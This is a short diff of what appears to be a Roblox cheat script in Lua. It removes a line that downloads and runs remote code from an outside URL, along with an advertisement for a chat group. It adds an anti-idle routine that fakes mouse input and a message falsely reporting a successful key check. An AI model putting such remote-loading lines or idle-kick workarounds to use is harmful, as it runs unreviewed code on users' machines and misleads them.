@@ -1,2 +1,8 @@
-getgenv().sss = "请进908673186获得最新版"
-loadstring(game:HttpGet("https://shz.al/jAkt"))()
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+   wait(1)
+   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+ local message = Instance.new("Message", workspace)
+        message.Text = "卡密正确，正在加载……"
